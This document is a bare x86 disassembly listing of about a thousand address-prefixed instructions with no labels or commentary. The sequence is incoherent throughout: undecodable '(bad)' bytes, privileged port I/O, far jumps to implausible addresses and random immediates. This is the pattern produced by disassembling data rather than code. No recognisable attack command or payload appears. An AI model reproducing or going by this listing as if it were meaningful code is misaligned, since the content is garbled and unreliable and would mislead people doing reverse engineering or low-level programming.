  423791:	mov    eax,gs
  423793:	adc    BYTE PTR [esi],ah
  423795:	mov    cl,0x20
  423797:	or     eax,0x41f3c9d0
  42379c:	and    DWORD PTR [ebx-0x54fec73],eax
  4237a2:	inc    ebp
  4237a3:	mov    edi,0x86ac84a4
  4237a8:	scas   al,BYTE PTR es:[edi]
  4237a9:	xchg   esi,eax
  4237aa:	xor    esp,DWORD PTR [edi-0x7cbba575]
  4237b0:	sbb    edi,edx
  4237b2:	test   DWORD PTR [esi+edx*4-0x51],esi
  4237b6:	inc    esp
  4237b7:	sbb    bl,ah
  4237b9:	stos   BYTE PTR es:[edi],al
  4237ba:	mov    al,0xd8
  4237bc:	add    BYTE PTR [esi+0x5ac18abf],ch
  4237c2:	inc    edi
  4237c3:	jg     0x4237ba
  4237c5:	push   ss
  4237c6:	in     eax,dx
  4237c7:	xchg   ebx,eax
  4237c8:	mov    BYTE PTR [ecx-0x58],ah
  4237cb:	in     al,dx
  4237cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237cd:	mov    ds:0xba73a9ae,al
  4237d2:	imul   ebx,DWORD PTR [ecx+0x489b2aa5],0xe1e16c15
  4237dc:	aaa    
  4237dd:	pop    ebp
  4237de:	and    dh,BYTE PTR [edx]
  4237e0:	lahf   
  4237e1:	add    bh,BYTE PTR [ebx-0x75]
  4237e4:	cwde   
  4237e5:	imul   ebp,DWORD PTR [eax+0x1d3770ec],0x21
  4237ec:	in     eax,dx
  4237ed:	cli    
  4237ee:	imul   edx,DWORD PTR [edx+0x74a9f544],0xffffffdf
  4237f5:	data16 mov bh,0x91
  4237f8:	xor    al,0x6
  4237fa:	stos   DWORD PTR es:[edi],eax
  4237fb:	and    DWORD PTR [eax-0x7ba6650a],eax
  423801:	iret   
  423802:	outs   dx,BYTE PTR ds:[esi]
  423803:	push   ebp
  423804:	ja     0x423834
  423806:	or     DWORD PTR [eax-0x5763a108],esp
  42380c:	jnp    0x423873
  42380e:	mov    DWORD PTR [edx],ebp
  423810:	retf   0x4b6f
  423813:	or     ecx,DWORD PTR [ebx+0x5280542b]
  423819:	out    dx,al
  42381a:	mov    edi,0x141fe392
  42381f:	dec    ecx
  423820:	pop    edx
  423821:	dec    eax
  423822:	leave  
  423823:	sub    esi,DWORD PTR [eax]
  423825:	jne    0x4237ea
  423827:	in     al,0xbf
  423829:	or     al,0x5e
  42382b:	icebp  
  42382c:	cdq    
  42382d:	add    ebx,DWORD PTR [ebp+ebx*1-0x23]
  423831:	cmp    BYTE PTR [eax-0x2453de89],bh
  423837:	dec    edi
  423838:	inc    ebp
  423839:	sbb    al,BYTE PTR [edi+eax*4-0x31]
  42383d:	std    
  42383e:	add    ebp,DWORD PTR [ecx+0xf]
  423841:	mov    cl,0x3e
  423843:	fsub   st,st(2)
  423845:	aaa    
  423846:	jl     0x4238be
  423848:	and    bh,BYTE PTR [eax-0x299e2a6f]
  42384e:	push   ebp
  42384f:	int    0x4a
  423851:	popa   
  423852:	ret    0xabc2
  423855:	(bad)  
  423856:	push   edi
  423857:	mov    al,ds:0x13534f62
  42385c:	aas    
  42385d:	es out 0xc5,eax
  423860:	sub    DWORD PTR [eax-0x35],ebx
  423863:	out    0x9c,al
  423865:	sub    eax,0xe00428b1
  42386a:	jmp    0x423834
  42386c:	and    ecx,DWORD PTR [edx+0x2b]
  42386f:	sub    al,0x21
  423871:	call   0x27b59071
  423876:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423877:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423878:	(bad)  
  423879:	(bad)  
  42387a:	cmp    eax,eax
  42387c:	fld    QWORD PTR [ecx-0x67dca14e]
  423882:	pop    ebx
  423883:	inc    ebx
  423884:	sbb    bh,BYTE PTR [edx+0x3b0eceed]
  42388a:	pop    edi
  42388b:	(bad)  
  42388c:	out    0xcc,al
  42388e:	cmp    DWORD PTR [edi-0x5e],esi
  423891:	addr16 pop es
  423893:	sbb    BYTE PTR [ecx+0x2b],dl
  423896:	sti    
  423897:	sub    ebp,DWORD PTR [edi+ebx*2+0x25]
  42389b:	sbb    ah,BYTE PTR [eax-0x7]
  42389e:	cmp    dh,bl
  4238a0:	jo     0x423881
  4238a2:	mov    ah,0x1e
  4238a4:	nop
  4238a5:	imul   ebx,DWORD PTR [eax+0x63f82b0d],0xa57dc6f0
  4238af:	ja     0x4238fc
  4238b1:	loop   0x423893
  4238b3:	or     dh,BYTE PTR [edx+0xc560b14]
  4238b9:	cli    
  4238ba:	ins    BYTE PTR es:[edi],dx
  4238bb:	jmp    0xbf8a:0x8258c1a4
  4238c2:	sbb    DWORD PTR [eax-0x65],0xfb9ce9d6
  4238c9:	lds    ecx,FWORD PTR [ecx-0x5a53f025]
  4238cf:	dec    ebp
  4238d0:	inc    ebp
  4238d1:	es lahf 
  4238d3:	cmp    BYTE PTR [edx+0x7153f996],ch
  4238d9:	fist   WORD PTR [ecx]
  4238db:	fcomp  QWORD PTR [esi]
  4238dd:	mov    dh,0x86
  4238df:	popa   
  4238e0:	adc    BYTE PTR ds:0x265dac5c,ch
  4238e6:	repz call 0xcf9fe05c
  4238ec:	inc    esi
  4238ed:	icebp  
  4238ee:	out    dx,al
  4238ef:	and    eax,0x870c5fa5
  4238f4:	xor    edx,DWORD PTR [esp+ebp*8-0x78f36c1c]
  4238fb:	inc    esi
  4238fc:	or     DWORD PTR [ebx],edx
  4238fe:	adc    eax,DWORD PTR [eax-0x1d]
  423901:	jbe    0x4238c2
  423903:	nop
  423904:	cs fs xchg ebp,eax
  423907:	xchg   edx,eax
  423908:	outs   dx,BYTE PTR ds:[esi]
  423909:	ret    
  42390a:	inc    esp
  42390b:	jo     0x4238db
  42390d:	or     bl,BYTE PTR [ecx]
  42390f:	pop    es
  423910:	out    dx,eax
  423911:	rcl    cl,0xc5
  423914:	lods   eax,DWORD PTR ds:[esi]
  423915:	cli    
  423916:	call   0x887c:0x14710591
  42391d:	div    DWORD PTR [eax+0x3655b697]
  423923:	in     al,dx
  423924:	xchg   DWORD PTR [esp+ecx*1],edi
  423927:	xchg   BYTE PTR [ecx],al
  423929:	sbb    DWORD PTR [ecx],eax
  42392b:	jae    0x423961
  42392d:	hlt    
  42392e:	out    0x4,eax
  423930:	mov    bl,0xf8
  423932:	push   DWORD PTR [edx]
  423934:	jno    0x423943
  423936:	push   eax
  423937:	outs   dx,DWORD PTR ds:[esi]
  423938:	xchg   ebx,esi
  42393a:	push   es
  42393b:	xchg   esp,eax
  42393c:	add    eax,0x12403ad3
  423941:	div    BYTE PTR [ebp+0x46]
  423944:	cmp    al,0x5e
  423946:	out    dx,eax
  423947:	mov    esi,0x6cb40c24
  42394c:	push   esp
  42394d:	sbb    DWORD PTR [esi-0x61c3b732],edi
  423953:	cdq    
  423954:	push   edi
  423955:	cmp    DWORD PTR [ecx-0x23ef9fa3],eax
  42395b:	push   esp
  42395c:	sub    al,0x5e
  42395e:	ja     0x42391c
  423960:	sahf   
  423961:	pushf  
  423962:	push   edi
  423963:	dec    esi
  423964:	in     eax,dx
  423965:	sub    DWORD PTR [ebx-0x6370619a],esi
  42396b:	repz add eax,0x2da411b4
  423971:	pop    edx
  423972:	xor    ebp,DWORD PTR [eax]
  423974:	inc    esp
  423975:	mov    eax,0xee78690f
  42397a:	xchg   BYTE PTR [edx-0x78],bl
  42397d:	pusha  
  42397e:	push   cs
  42397f:	sbb    BYTE PTR [ebx-0x5f7f3416],dh
  423985:	push   eax
  423986:	jmpw   0x3f24
  42398a:	cdq    
  42398b:	xchg   BYTE PTR [ecx],bh
  42398d:	rcl    cl,cl
  42398f:	scas   eax,DWORD PTR es:[edi]
  423990:	ds dec ecx
  423992:	jmp    0xe445:0x29932e24
  423999:	push   es
  42399a:	out    0xca,al
  42399c:	rol    BYTE PTR [esi+0x3b],0x96
  4239a0:	xchg   esp,eax
  4239a1:	clc    
  4239a2:	and    BYTE PTR [ebp+0x267489a9],bl
  4239a8:	mov    edi,0xb818b44f
  4239ad:	es xchg ebx,eax
  4239af:	aas    
  4239b0:	add    bh,BYTE PTR [edi+0x6731ebc5]
  4239b6:	inc    ebx
  4239b7:	ins    BYTE PTR es:[edi],dx
  4239b8:	sbb    al,0x55
  4239ba:	mov    esi,0x509677d3
  4239bf:	cmp    al,0x13
  4239c1:	mov    ebx,0x7e4d8e2b
  4239c6:	pop    esi
  4239c7:	test   BYTE PTR [esi-0x2c],0x49
  4239cb:	xor    al,0x23
  4239cd:	in     al,dx
  4239ce:	cmp    ch,BYTE PTR [ebp-0x2bb79a55]
  4239d4:	jecxz  0x4239f8
  4239d6:	dec    ecx
  4239d7:	stos   DWORD PTR es:[edi],eax
  4239d8:	ja     0x423989
  4239da:	lea    edx,[ecx-0x57a61449]
  4239e0:	jp     0x4239d6
  4239e2:	lds    ecx,FWORD PTR [esi-0x131dc0b6]
  4239e8:	pop    edi
  4239e9:	stos   DWORD PTR es:[edi],eax
  4239ea:	enter  0x4a33,0xf1
  4239ee:	std    
  4239ef:	loop   0x4239a3
  4239f1:	pop    ds
  4239f2:	jg     0x423a04
  4239f4:	mov    ebp,ebp
  4239f6:	(bad)  
  4239f7:	jmp    0x4239b7
  4239f9:	cmp    al,0xdd
  4239fb:	xchg   esi,eax
  4239fc:	mov    DWORD PTR [eax],eax
  4239fe:	add    BYTE PTR [eax],al
  423a00:	add    BYTE PTR [eax],al
  423a02:	inc    esi
  423a03:	xchg   edi,eax
  423a04:	daa    
  423a05:	cmp    esi,edi
  423a07:	mov    ebx,0x9b53ff5e
  423a0c:	and    ebx,DWORD PTR [ebp+0x3fe84bf8]
  423a12:	xor    BYTE PTR [ebx+0x4f30001],dh
  423a18:	add    BYTE PTR [eax],al
  423a1a:	into   
  423a1b:	jmp    0x18a1:0x63ce443c
  423a22:	iret   
  423a23:	sub    BYTE PTR [eax+ebx*8],dh
  423a26:	dec    ebx
  423a27:	mov    cl,0xa4
  423a29:	and    al,0x33
  423a2b:	dec    esi
  423a2c:	jl     0x423a0f
  423a2e:	xchg   ecx,eax
  423a2f:	and    DWORD PTR [ecx-0x4a],edx
  423a32:	mov    eax,DWORD PTR [ebp-0x80]
  423a35:	std    
  423a36:	add    edx,edx
  423a38:	in     al,0xf
  423a3a:	push   ecx
  423a3b:	mov    edx,0x70956cc2
  423a40:	jmp    0x92141002
  423a45:	mov    ?,WORD PTR [ebx]
  423a47:	push   ds
  423a48:	pop    ebx
  423a49:	xchg   ecx,eax
  423a4a:	cs ins DWORD PTR es:[di],dx
  423a4d:	inc    edi
  423a4e:	push   esp
  423a4f:	xchg   ebp,eax
  423a50:	js     0x423a17
  423a52:	mov    edx,0x71d2f379
  423a57:	dec    edi
  423a58:	mov    ds:0xd37c25a3,al
  423a5d:	pop    ds
  423a5e:	mov    ebx,0xd99961d6
  423a63:	stc    
  423a64:	sar    DWORD PTR ds:0x1334649f,0xc
  423a6b:	mov    ebx,0x3ba82418
  423a70:	xor    bh,BYTE PTR [eax-0x4c8a74e7]
  423a76:	push   eax
  423a77:	mov    eax,0x2a2cca84
  423a7c:	sbb    al,ah
  423a7e:	fsub   QWORD PTR [edi]
  423a80:	into   
  423a81:	sub    al,0xe1
  423a83:	test   DWORD PTR [esi],esi
  423a85:	arpl   bp,di
  423a87:	inc    ebp
  423a88:	jp     0x423ac8
  423a8a:	cwde   
  423a8b:	push   ecx
  423a8c:	rcr    eax,cl
  423a8e:	push   ecx
  423a8f:	(bad)  
  423a90:	mov    ebx,0x12c34bf7
  423a95:	sub    dl,bh
  423a97:	dec    eax
  423a98:	in     eax,dx
  423a99:	aam    0xa
  423a9b:	sub    BYTE PTR [eax-0x13],bh
  423a9e:	mov    esi,0xcfb665db
  423aa3:	cmc    
  423aa4:	adc    al,0x79
  423aa6:	fisubr WORD PTR [ebx]
  423aa8:	ins    BYTE PTR es:[edi],dx
  423aa9:	iret   
  423aaa:	ror    DWORD PTR [edx+0x590f1f0e],cl
  423ab0:	daa    
  423ab1:	in     eax,0x13
  423ab3:	dec    edi
  423ab4:	adc    eax,0x6a9530bb
  423ab9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423aba:	inc    edx
  423abb:	neg    BYTE PTR [edx+0x1b]
  423abe:	and    DWORD PTR [edx+0x35],0xffffffca
  423ac2:	push   cs
  423ac3:	hlt    
  423ac4:	xor    edi,DWORD PTR [ebx]
  423ac6:	jbe    0x423a77
  423ac8:	hlt    
  423ac9:	add    BYTE PTR [ecx+0x7d],cl
  423acc:	cld    
  423acd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ace:	push   ecx
  423acf:	pop    ds
  423ad0:	push   0xffffffca
  423ad2:	mov    esi,0x3017245c
  423ad7:	xchg   ecx,eax
  423ad8:	les    ebp,FWORD PTR [ebp-0x80]
  423adb:	pushf  
  423adc:	push   0xffffffe6
  423ade:	jnp    0x423add
  423ae0:	jmp    0x4c51:0x49872c19
  423ae7:	popa   
  423ae8:	add    DWORD PTR [edx],ebp
  423aea:	fild   WORD PTR [ebp+0x4a]
  423aed:	or     ah,BYTE PTR [esi-0x16]
  423af0:	mov    ?,WORD PTR [ecx-0x12]
  423af3:	adc    al,0xa1
  423af5:	and    DWORD PTR [ebp+0x5afa2812],esp
  423afb:	sub    al,0xff
  423afd:	loopne 0x423ad7
  423aff:	inc    esp
  423b00:	aad    0x6d
  423b02:	push   edx
  423b03:	and    al,0xc0
  423b05:	cld    
  423b06:	mov    al,0xf
  423b08:	sahf   
  423b09:	cli    
  423b0a:	rol    BYTE PTR es:[esi+0x4],1
  423b0e:	cmp    eax,0x8b25b76
  423b13:	dec    edx
  423b14:	(bad)  
  423b15:	push   edi
  423b16:	idiv   BYTE PTR [ebx-0x6]
  423b19:	sbb    eax,0x7887ec46
  423b1e:	pop    esi
  423b1f:	mov    ch,bl
  423b21:	sbb    esi,DWORD PTR [eax+edx*2]
  423b24:	imul   ecx,DWORD PTR [ecx],0x52808625
  423b2a:	das    
  423b2b:	mov    cl,BYTE PTR [ebx-0x2d]
  423b2e:	sub    ebp,ebp
  423b30:	lahf   
  423b31:	fbld   TBYTE PTR [esi]
  423b33:	out    0xff,eax
  423b35:	rol    DWORD PTR [ecx-0x32],cl
  423b38:	fcomp  DWORD PTR [edx+0x3705ea8f]
  423b3e:	pop    ds
  423b3f:	adc    eax,0x111f17f7
  423b44:	js     0x423b74
  423b46:	pop    ebx
  423b47:	lahf   
  423b48:	out    dx,al
  423b49:	push   ebx
  423b4a:	pop    esi
  423b4b:	sahf   
  423b4c:	jmp    0xadf6ea51
  423b51:	mov    cl,0x9f
  423b53:	push   ss
  423b54:	mov    ecx,0x4afed627
  423b59:	mov    ch,0x3e
  423b5b:	mov    eax,0xe2b9b6d7
  423b60:	int3   
  423b61:	mov    ebp,0x9d37fedc
  423b66:	int3   
  423b67:	outs   dx,DWORD PTR ds:[esi]
  423b68:	mov    bh,0xc1
  423b6a:	aam    0xfb
  423b6c:	mov    ds:0x8f99977f,al
  423b71:	(bad)  
  423b73:	xor    eax,0xb34a17b3
  423b78:	popf   
  423b79:	xchg   esp,eax
  423b7a:	mov    bl,0x96
  423b7c:	xchg   edi,eax
  423b7d:	adc    DWORD PTR [eax],ebp
  423b7f:	xchg   ah,ah
  423b81:	in     eax,0xd1
  423b83:	sub    eax,0x307ef079
  423b88:	mov    al,0x96
  423b8a:	arpl   si,di
  423b8c:	xchg   BYTE PTR [edi-0x1e],dh
  423b8f:	scas   al,BYTE PTR es:[edi]
  423b90:	xchg   DWORD PTR [edi+0x513e65b5],esi
  423b96:	add    esp,esi
  423b98:	add    eax,0x5c684dc8
  423b9d:	out    0x79,eax
  423b9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423ba1:	xor    DWORD PTR [edx+0x523c5bf6],ebp
  423ba7:	out    0x7e,eax
  423ba9:	sub    ah,BYTE PTR [eax-0x5c]
  423bac:	pop    edi
  423bad:	sbb    ebx,ebp
  423baf:	jo     0x423b5b
  423bb1:	(bad)  
  423bb2:	std    
  423bb3:	lea    ecx,[eax+0x7de7b967]
  423bb9:	ror    DWORD PTR [ebp-0x728b1718],1
  423bbf:	dec    ebx
  423bc0:	fcmovnu st,st(2)
  423bc2:	scas   al,BYTE PTR es:[edi]
  423bc3:	mov    dh,BYTE PTR [ebp-0x2]
  423bc6:	pop    ecx
  423bc7:	cmp    edx,ebp
  423bc9:	cmp    DWORD PTR [si],ecx
  423bcc:	retf   0x9b91
  423bcf:	pop    es
  423bd0:	shl    dl,0x8c
  423bd3:	lods   al,BYTE PTR ds:[esi]
  423bd4:	aas    
  423bd5:	fdiv   QWORD PTR [edx+0x2fca6a23]
  423bdb:	pop    esp
  423bdc:	inc    edi
  423bdd:	pop    esi
  423bde:	fs push ss
  423be0:	jl     0x423bf3
  423be2:	sahf   
  423be3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423be4:	add    BYTE PTR [ebp-0x2b40cf51],cl
  423bea:	cmp    al,0xba
  423bec:	scas   eax,DWORD PTR es:[edi]
  423bed:	neg    esp
  423bef:	adc    eax,0x7f37a818
  423bf4:	jge    0x423c1e
  423bf6:	mov    ch,0xb
  423bf8:	xadd   BYTE PTR [ecx],bl
  423bfb:	pop    esi
  423bfc:	mov    ebx,0x5a460972
  423c01:	pushf  
  423c02:	sbb    BYTE PTR [edi],ah
  423c04:	and    eax,0x6a8edae1
  423c09:	push   ebx
  423c0a:	cmp    al,0x4c
  423c0c:	and    DWORD PTR [ebx-0x5f],ebp
  423c0f:	repnz ror BYTE PTR [eax+0x26975907],1
  423c16:	cli    
  423c17:	sub    al,0x71
  423c19:	push   esp
  423c1a:	(bad)  
  423c1b:	mov    ds:0xc524e885,al
  423c20:	add    esp,ebp
  423c22:	mov    ebp,0xab0f72a0
  423c27:	add    dl,0x0
  423c2a:	or     esp,DWORD PTR [ebx]
  423c2c:	in     al,0x70
  423c2e:	sub    DWORD PTR [eax+esi*2-0x2d265675],esi
  423c35:	cs out dx,al
  423c37:	repnz out dx,eax
  423c39:	repz xlat BYTE PTR ss:[ebx]
  423c3c:	stos   BYTE PTR es:[edi],al
  423c3d:	and    BYTE PTR [edx-0x303e288c],0x86
  423c44:	mov    eax,DWORD PTR fs:[esi+0xf]
  423c48:	cmp    BYTE PTR [ebp+0x3474fe91],dl
  423c4e:	icebp  
  423c4f:	dec    eax
  423c50:	pop    ebx
  423c51:	sbb    al,BYTE PTR [eax]
  423c53:	pop    ecx
  423c54:	push   0x5a
  423c56:	pop    ds
  423c57:	mov    ds:0x78002669,eax
  423c5c:	icebp  
  423c5d:	std    
  423c5e:	aam    0x8
  423c60:	jl     0x423ccd
  423c62:	sbb    dl,al
  423c64:	push   ebx
  423c65:	mov    ebp,0xa7ba5f72
  423c6a:	scas   al,BYTE PTR es:[edi]
  423c6b:	retf   
  423c6c:	push   ebp
  423c6d:	xor    eax,0xa084267b
  423c72:	add    BYTE PTR [edi+0x135c2b17],bl
  423c78:	fld    QWORD PTR [edx+0x2ec7db55]
  423c7e:	loopne 0x423c53
  423c80:	out    dx,eax
  423c81:	inc    edx
  423c82:	xchg   esi,eax
  423c83:	aam    0xe8
  423c85:	and    al,0xe
  423c87:	(bad)  [edx+edi*8]
  423c8a:	icebp  
  423c8b:	icebp  
  423c8c:	xchg   DWORD PTR [eax-0x72],ebx
  423c8f:	fistp  DWORD PTR [ebp-0x4d2b1064]
  423c95:	popa   
  423c96:	push   ecx
  423c97:	stos   DWORD PTR es:[edi],eax
  423c98:	pop    ss
  423c99:	loopne 0x423cd9
  423c9b:	jp     0x423cd4
  423c9d:	lods   eax,DWORD PTR ds:[esi]
  423c9e:	jbe    0x423cbf
  423ca0:	imul   BYTE PTR [edx]
  423ca2:	jne    0x423cda
  423ca4:	jge    0x423c7b
  423ca6:	es and ah,0x7e
  423caa:	outs   dx,BYTE PTR ds:[esi]
  423cab:	loopne 0x423c7b
  423cad:	push   edx
  423cae:	popa   
  423caf:	xlat   BYTE PTR ds:[ebx]
  423cb0:	pop    ds
  423cb1:	scas   eax,DWORD PTR es:[edi]
  423cb2:	xor    cl,BYTE PTR [esi+ecx*2+0x27]
  423cb6:	out    0xb0,eax
  423cb8:	or     ah,BYTE PTR [edi-0x62c589ec]
  423cbe:	mov    BYTE PTR [ebx-0x7b032d97],ch
  423cc4:	push   eax
  423cc5:	call   DWORD PTR [edx+eiz*4]
  423cc8:	inc    eax
  423cc9:	dec    edi
  423cca:	outs   dx,BYTE PTR ds:[esi]
  423ccb:	pop    ecx
  423ccc:	lods   al,BYTE PTR ds:[esi]
  423ccd:	mov    eax,ds:0xf7f07f20
  423cd2:	add    eax,DWORD PTR [eax]
  423cd4:	add    DWORD PTR [edx-0x551e8027],esi
  423cda:	or     al,0xb5
  423cdc:	cmp    BYTE PTR [edx+0x318efb20],bl
  423ce2:	lods   al,BYTE PTR ds:[esi]
  423ce3:	pop    ebp
  423ce4:	in     eax,0x58
  423ce6:	inc    eax
  423ce7:	loopne 0x423ce9
  423ce9:	mov    eax,DWORD PTR [esi-0x61]
  423cec:	int3   
  423ced:	js     0x423cd3
  423cef:	push   esp
  423cf0:	repnz fcomp QWORD PTR ds:0xefbe749c
  423cf7:	mov    al,BYTE PTR [edi-0x3]
  423cfa:	(bad)  
  423cfb:	jns    0x423d24
  423cfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423cfe:	ins    DWORD PTR es:[edi],dx
  423cff:	or     eax,0x40fa7e15
  423d04:	mov    dl,0x37
  423d06:	push   ecx
  423d07:	adc    eax,ebx
  423d09:	mov    dh,0x8e
  423d0b:	in     al,dx
  423d0c:	scas   al,BYTE PTR es:[edi]
  423d0d:	fistp  DWORD PTR [edi+esi*1]
  423d10:	fs push ss
  423d12:	loopne 0x423d24
  423d14:	int    0x64
  423d16:	pusha  
  423d17:	cmp    DWORD PTR [esi-0x42a88f9a],edi
  423d1d:	sahf   
  423d1e:	and    ecx,DWORD PTR [edx+0x54d2e3fe]
  423d24:	jo     0x423d51
  423d26:	aam    0x77
  423d28:	repnz push esi
  423d2a:	sahf   
  423d2b:	xchg   ecx,eax
  423d2c:	ja     0x423dab
  423d2e:	jl     0x423d02
  423d30:	push   0xfffffff7
  423d32:	pop    esp
  423d33:	out    0x87,al
  423d35:	mov    edi,0x75fc9421
  423d3a:	std    
  423d3b:	icebp  
  423d3c:	fcom   st(7)
  423d3e:	(bad)  [edi+esi*8]
  423d41:	mov    WORD PTR [edi],?
  423d43:	fild   WORD PTR [ecx]
  423d45:	cmc    
  423d46:	mov    esp,0xddc6589
  423d4b:	or     DWORD PTR [ebp-0x2aeaa098],edi
  423d51:	inc    eax
  423d52:	push   edx
  423d53:	adc    eax,0x60736ecd
  423d58:	xchg   edx,eax
  423d59:	call   0x2d17a9c2
  423d5e:	xchg   DWORD PTR [esi-0x7ba7ce2b],eax
  423d64:	cdq    
  423d65:	add    eax,0x377e6121
  423d6a:	sar    ch,1
  423d6c:	pushf  
  423d6d:	cmp    DWORD PTR [edx+ebp*1+0x364b7317],0xfefab09d
  423d78:	inc    edx
  423d79:	adc    bh,BYTE PTR [ecx-0x4b67f490]
  423d7f:	mov    edi,ebx
  423d81:	push   ebp
  423d82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d83:	mov    ebp,0xbbe6d786
  423d88:	sbb    BYTE PTR [ebp-0x78],dl
  423d8b:	lods   eax,DWORD PTR ds:[esi]
  423d8c:	jnp    0x423d16
  423d8e:	das    
  423d8f:	cld    
  423d90:	push   ebx
  423d91:	cdq    
  423d92:	(bad)  
  423d93:	fld    QWORD PTR [ecx-0x10823956]
  423d99:	mov    esp,0x1f364118
  423d9e:	sbb    BYTE PTR [esi-0x483c6d98],ah
  423da4:	into   
  423da5:	or     DWORD PTR [ebx],ebx
  423da7:	outs   dx,DWORD PTR ds:[esi]
  423da8:	dec    edi
  423da9:	cwde   
  423daa:	mov    bh,0x50
  423dac:	icebp  
  423dad:	sbb    BYTE PTR [ebx+0x7b],dl
  423db0:	leave  
  423db1:	mov    bh,0x4e
  423db3:	test   al,0x3e
  423db5:	or     DWORD PTR [edi+0x2c],edi
  423db8:	mov    ebp,0x396bc362
  423dbd:	addr16 push 0x495f3b25
  423dc3:	stos   DWORD PTR es:[edi],eax
  423dc4:	xchg   esp,eax
  423dc5:	fsubr  DWORD PTR [ecx-0x5ec9cf37]
  423dcb:	leavew 
  423dcd:	xor    BYTE PTR [edx],ah
  423dcf:	imul   eax,ebx,0xffffffe7
  423dd2:	lods   eax,DWORD PTR ds:[esi]
  423dd3:	sub    al,0xdf
  423dd5:	dec    edi
  423dd6:	or     esp,DWORD PTR [ebp+0x44e61f79]
  423ddc:	or     eax,0x35f301ac
  423de1:	dec    ebx
  423de2:	shl    DWORD PTR [edx-0xc],cl
  423de5:	cld    
  423de6:	test   BYTE PTR [ecx-0x10f4b5e9],0xbc
  423ded:	retf   
  423dee:	dec    esi
  423def:	xor    BYTE PTR [edi+0x356bcfc6],ah
  423df5:	push   eax
  423df6:	push   ecx
  423df7:	fwait
  423df8:	jo     0x423e64
  423dfa:	gs call 0xf36f:0xa98e81b
  423e02:	ret    
  423e03:	mov    BYTE PTR [eax],cl
  423e05:	loopne 0x423d97
  423e07:	hlt    
  423e08:	mov    esi,0xf2947c2d
  423e0d:	sub    al,0x86
  423e0f:	adc    esi,ebp
  423e11:	push   ebp
  423e12:	or     DWORD PTR [eax+edx*4+0x40],edx
  423e16:	push   ecx
  423e17:	cdq    
  423e18:	xor    BYTE PTR [ecx-0x4c],ah
  423e1b:	mov    ecx,0x8ad36cd2
  423e20:	or     ecx,DWORD PTR [esi+0x2f]
  423e23:	in     eax,0xca
  423e25:	int    0x8c
  423e27:	inc    edx
  423e28:	mov    BYTE PTR [edx],bh
  423e2a:	je     0x423e7a
  423e2c:	enter  0xd609,0x87
  423e30:	mov    eax,ds:0x458a4926
  423e35:	fmul   st,st(1)
  423e37:	psadbw mm4,mm4
  423e3a:	inc    ecx
  423e3b:	xlat   BYTE PTR ds:[ebx]
  423e3c:	daa    
  423e3d:	das    
  423e3e:	out    0x2b,eax
  423e40:	clc    
  423e41:	int    0x7b
  423e43:	mov    esp,0x7e5d0e7c
  423e48:	rcr    DWORD PTR [ebx+0x4d],1
  423e4b:	push   0xab5c822b
  423e50:	xchg   ebp,eax
  423e51:	rcl    cl,cl
  423e53:	inc    ebp
  423e54:	add    dl,dh
  423e56:	jne    0x423e01
  423e58:	mov    ch,0x97
  423e5a:	(bad)  
  423e5b:	xchg   edi,eax
  423e5c:	jle    0x423df6
  423e5e:	(bad)  
  423e5f:	mov    al,ds:0x524c1124
  423e64:	ss fwait
  423e66:	cmc    
  423e67:	xchg   bh,ah
  423e69:	lds    edi,FWORD PTR [edx]
  423e6b:	cdq    
  423e6c:	inc    ebx
  423e6d:	mov    al,ds:0xac71f7fe
  423e72:	dec    esi
  423e73:	(bad)  
  423e74:	jmp    0x4234:0x83da0d93
  423e7b:	loopne 0x423e65
  423e7d:	dec    edi
  423e7e:	dec    eax
  423e7f:	pop    eax
  423e80:	pop    es
  423e81:	add    eax,0xb4b065a9
  423e86:	push   ecx
  423e87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e88:	inc    edx
  423e89:	(bad)  
  423e8a:	xor    eax,0x32102fba
  423e8f:	or     eax,0xe8018f53
  423e94:	lahf   
  423e95:	aad    0x2
  423e97:	sbb    al,0xae
  423e99:	shr    dh,0x57
  423e9c:	js     0x423eef
  423e9e:	popf   
  423e9f:	dec    ebp
  423ea0:	sti    
  423ea1:	retf   0xd614
  423ea4:	jns    0x423e8c
  423ea6:	call   0xa72f713d
  423eab:	xchg   di,ax
  423ead:	dec    edx
  423eae:	ja     0x423e6e
  423eb0:	adc    bl,BYTE PTR [ebx+0xc247586]
  423eb6:	jns    0x423ef1
  423eb8:	call   0xa561:0x3556a16a
  423ebf:	(bad)  
  423ec0:	adc    bl,ch
  423ec2:	fnstcw WORD PTR [eax]
  423ec4:	cwde   
  423ec5:	dec    ecx
  423ec6:	inc    DWORD PTR [esi+0x27a03ef2]
  423ecc:	jne    0x423f3e
  423ece:	or     dh,dl
  423ed0:	leave  
  423ed1:	imul   edi,DWORD PTR [edi-0x52],0xffffffd4
  423ed5:	jmp    0xc618:0xa5252c8e
  423edc:	dec    edi
  423edd:	(bad)  
  423ede:	pop    ds
  423edf:	inc    esi
  423ee0:	pop    ebx
  423ee1:	jno    0x423edc
  423ee3:	aas    
  423ee4:	add    DWORD PTR [ecx+0x7a99d6a6],ebp
  423eea:	push   ecx
  423eeb:	pop    esi
  423eec:	mov    DWORD PTR [ecx+0x62255b71],0x75b277e9
  423ef6:	es jmp 0x1dee:0x42b9388e
  423efe:	mov    bh,0xd3
  423f00:	outs   dx,BYTE PTR ds:[esi]
  423f01:	test   esi,0xda6acec3
  423f07:	iret   
  423f08:	inc    ebp
  423f09:	add    dl,BYTE PTR [ecx]
  423f0b:	push   ds
  423f0c:	imul   eax,DWORD PTR [eax],0x0
  423f12:	sar    al,cl
  423f14:	data16 outs dx,BYTE PTR es:[esi]
  423f17:	mov    esi,0x8c85fcd2
  423f1c:	out    dx,al
  423f1d:	fisubr DWORD PTR [edx]
  423f1f:	cmc    
  423f20:	lods   eax,DWORD PTR ds:[esi]
  423f21:	aas    
  423f22:	and    edi,DWORD PTR [eax+0x4f30001]
  423f28:	add    BYTE PTR [eax],al
  423f2a:	(bad)  
  423f2b:	nop
  423f2c:	lea    ebp,[esp+edx*1+0x116ebabb]
  423f33:	mov    ecx,0x6be7c8c8
  423f38:	and    BYTE PTR [esi],ch
  423f3a:	mov    edx,0x4c967e28
